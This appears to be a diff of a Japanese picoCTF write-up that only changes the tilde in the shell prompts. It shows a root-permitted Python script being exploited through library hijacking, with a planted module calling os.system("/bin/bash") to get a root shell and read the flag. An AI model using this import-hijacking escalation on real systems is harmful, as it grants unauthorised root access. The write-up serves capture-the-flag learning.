@@ -52,7 +52,7 @@ Matching Defaults entries for picoctf on challenge:
 User picoctf may run the following commands on challenge:  
     (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py  
 
-picoctf@challenge:~$ cat .server.py  
+picoctf@challenge:〜$ cat .server.py  
 import base64  
 import os  
 import socket  
@@ -69,7 +69,7 @@ picoctf@challenge:~$ cat .server.py
 import os  
 os.system("/bin/bash")  
 
-picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py  
+picoctf@challenge:〜$ sudo /usr/bin/python3 /home/picoctf/.server.py  
 root@challenge:/home/picoctf# ls -la  
 total 24  
 drwxr-xr-x 1 picoctf picoctf   73 Jul  6 06:42 .  
@@ -116,7 +116,7 @@ drwxr-xr-x 1 root root   51 Jul  6 06:38 ..
 -rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc  
 -rw-r--r-- 1 root root   43 Sep 26  2024 .flag.txt  
 -rw-r--r-- 1 root root  161 Dec  5  2019 .profile  
-root@challenge:~# cat .flag.txt  
+root@challenge:〜# cat .flag.txt  
 picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}  
 
 # 考えたこと  
